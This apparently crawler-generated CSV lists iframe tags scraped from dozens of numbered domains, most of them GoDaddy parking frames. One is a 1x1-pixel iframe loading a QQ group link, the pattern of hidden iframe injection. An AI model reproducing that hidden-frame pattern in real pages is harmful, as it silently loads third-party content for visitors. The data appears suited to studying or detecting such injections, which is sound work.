Index,Iframe,domain,filename
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlZv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj222.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3882_20170727_174317/html_200_20170727_174317.txt
0,"<iframe <="""" allowtransparency=""true"" frameborder=""0"" height=""170"" iframe="""" scrolling=""no"" src=""http://www.lelelove520.com/cs.asp"" width=""200""></iframe>",http://010xinlei.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8113_20170727_152401/html_200_20170727_152401.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj26.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9694_20170727_174321/html_200_20170727_174321.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj23.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8071_20170727_174318/html_200_20170727_174318.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj88.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1183_20170727_174503/html_200_20170727_174503.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj95.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6574_20170727_174539/html_200_20170727_174539.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjAGAjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50053cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_396_20170727_171848/html_200_20170727_171848.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj68.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2643_20170727_174445/html_200_20170727_174445.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj56.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8057_20170727_174420/html_200_20170727_174420.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmplYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj72.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5051_20170727_174448/html_200_20170727_174448.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp4BF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj789.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6396_20170727_174455/html_200_20170727_174455.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj14.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_646_20170727_174306/html_200_20170727_174306.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj48.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1340_20170727_174403/html_200_20170727_174403.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjAGOjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50050cp.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9349_20170727_171845/html_200_20170727_171845.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3Al5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj777.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5877_20170727_174452/html_200_20170727_174452.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj21.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6085_20170727_174315/html_200_20170727_174315.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwyjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50029cp.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3768_20170727_171830/html_200_20170727_171830.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj55.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7780_20170727_174411/html_200_20170727_174411.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj53.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2761_20170727_174409/html_200_20170727_174409.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmSjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50031cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1632_20170727_171833/html_200_20170727_171833.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx5BGxhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj9999.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9511_20170727_174545/html_200_20170727_174545.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj58.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1249_20170727_174423/html_200_20170727_174423.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj84.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8921_20170727_174500/html_200_20170727_174500.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj86.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8818_20170727_174502/html_200_20170727_174502.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://06636.net,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3025_20170727_171342/html_200_20170727_171342.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://636470.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6058_20170727_172218/html_200_20170727_172218.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj37.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9519_20170727_174347/html_200_20170727_174347.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj18.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3297_20170727_174312/html_200_20170727_174312.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj35.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5966_20170727_174346/html_200_20170727_174346.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj40.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5530_20170727_174350/html_200_20170727_174350.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj74.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_402_20170727_174450/html_200_20170727_174450.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmujLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50038cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6420_20170727_171838/html_200_20170727_171838.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD0AP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj444.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2103_20170727_174355/html_200_20170727_174355.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj65.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6387_20170727_174429/html_200_20170727_174429.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj47.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6121_20170727_174401/html_200_20170727_174402.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj29.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4555_20170727_174329/html_200_20170727_174329.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj85.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6723_20170727_174501/html_200_20170727_174501.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj94.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8957_20170727_174537/html_200_20170727_174537.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj20.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5582_20170727_174315/html_200_20170727_174315.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj30.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_557_20170727_174331/html_200_20170727_174331.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj60.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9950_20170727_174425/html_200_20170727_174425.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj62.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2488_20170727_174427/html_200_20170727_174427.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj57.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1442_20170727_174422/html_200_20170727_174422.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj42.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3250_20170727_174352/html_200_20170727_174352.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj96.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8186_20170727_174540/html_200_20170727_174540.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj25.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8894_20170727_174320/html_200_20170727_174320.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwujLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50028cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9206_20170727_171830/html_200_20170727_171830.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj36.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8940_20170727_174346/html_200_20170727_174346.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj41.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6391_20170727_174351/html_200_20170727_174351.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj19.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3556_20170727_174313/html_200_20170727_174313.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL3BP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj678.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9889_20170727_174444/html_200_20170727_174444.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj15.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3610_20170727_174310/html_200_20170727_174310.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj81.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3356_20170727_174457/html_200_20170727_174457.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmpjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj70.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4650_20170727_174447/html_200_20170727_174447.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj43.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_276_20170727_174353/html_200_20170727_174353.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRjZP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj100.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1171_20170727_174301/html_200_20170727_174301.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmWjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50032cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4975_20170727_171834/html_200_20170727_171834.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj33.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8204_20170727_174340/html_200_20170727_174340.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj97.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9406_20170727_174541/html_200_20170727_174541.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj80.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9151_20170727_174456/html_200_20170727_174456.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj87.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3071_20170727_174502/html_200_20170727_174502.txt
0,"<iframe frameborder=""0"" height=""1"" name=""I8"" scrolling=""no"" src=""http://shang.qq.com/wpa/qunwpa?idkey=c95aa95edbccafbae8f40c8481b697ae98669e850199348f7cf8fee10755f357"" target=""_blank"" width=""1""></iframe>",http://605389.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1599_20170727_172217/html_200_20170727_172217.txt
